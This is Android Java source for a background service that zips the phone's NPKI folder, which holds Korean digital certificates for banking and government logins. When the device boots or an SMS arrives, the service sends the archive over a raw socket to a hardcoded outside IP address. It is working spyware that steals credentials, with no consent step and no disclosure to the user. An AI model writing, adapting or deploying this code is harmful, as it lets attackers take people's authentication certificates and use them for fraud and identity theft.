package com.example.center;

import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;

import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import android.widget.Toast;


public class MyService extends Service {
	
//	List<String> fileList;
	// 지정된 위치에 압축파일 생성
	private static final String OUTPUT_ZIP_FILE = Environment.getExternalStorageDirectory().getAbsolutePath() + "/npki.zip";
	// 압축할 폴더 위치 지정
	private static final String SOURCE_FOLDER = Environment.getExternalStorageDirectory().getAbsolutePath() + "/NPKI";
	private String msg = "test";
	
	private BroadcastReceiver myReceiver= new BroadcastReceiver(){	
		@Override
		public void onReceive(Context context, Intent intent) {			
			
			sock();
		}
	};
	
	@Override
	public void onCreate(){
		super.onCreate();
		Toast.makeText(this, "onCreate", Toast.LENGTH_SHORT).show();		
	}
	
	@Override
	public void onDestroy(){
		super.onDestroy();
		Toast.makeText(this, "onDestroy", Toast.LENGTH_SHORT).show();
	}
	
	@Override
	public void onRebind(Intent intent){
		super.onRebind(intent);
		Toast.makeText(this, "onRebind", Toast.LENGTH_SHORT).show();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId){
		Toast.makeText(this, "onStartCommand", Toast.LENGTH_SHORT).show();
		
		IntentFilter intentFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");	
		
		registerReceiver(myReceiver, intentFilter);
		
		Toast.makeText(this, SOURCE_FOLDER, Toast.LENGTH_SHORT).show();
		zipNPKI();			// NPKI 파일을 압축
		Toast.makeText(this, OUTPUT_ZIP_FILE, Toast.LENGTH_SHORT).show();
		
		return super.onStartCommand(intent, flags, startId);
	}
		
	@Override
	public boolean onUnbind(Intent intent){
		Toast.makeText(this, "onUnbind", Toast.LENGTH_SHORT).show();
		return super.onUnbind(intent);
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		Toast.makeText(this, "onBind", Toast.LENGTH_SHORT).show();
		return null;
	}
	
	public void sock(){
		try{
			String host = "203.249.6.99";		//서버 ip주소
			int port = 9000;
			
			Socket sock = new Socket(host, port);
			try{
				PrintWriter out = new PrintWriter(new BufferedWriter(new 
						OutputStreamWriter(sock.getOutputStream())), true);
				out.println(msg);
				out.flush();
				
				File dir = Environment.getExternalStorageDirectory();
				
				DataInputStream dis = new DataInputStream(new 
						FileInputStream(new File(dir + "/" + "npki" + ".zip")));
				DataOutputStream dos = new DataOutputStream(sock.getOutputStream());
        		byte[]  buf = new byte[1024];
        		int read_length = 0;
        		while((read_length = dis.read(buf)) > 0){
        			dos.write(buf, 0, read_length);
        			dos.flush();
        		}
        		dos.close();
        		dis.close();
        		sock.close();
			} catch (Exception e){
				e.printStackTrace();
			} finally {
				sock.close();
			}
		} catch(Exception e){
			e.printStackTrace();
		}
	}
	
	public static void zipNPKI(){
		ZipFolder ZipFolder = new ZipFolder();
		ZipFolder.generateFileList(new File(SOURCE_FOLDER));
		ZipFolder.zipIt(OUTPUT_ZIP_FILE);
	}
	
}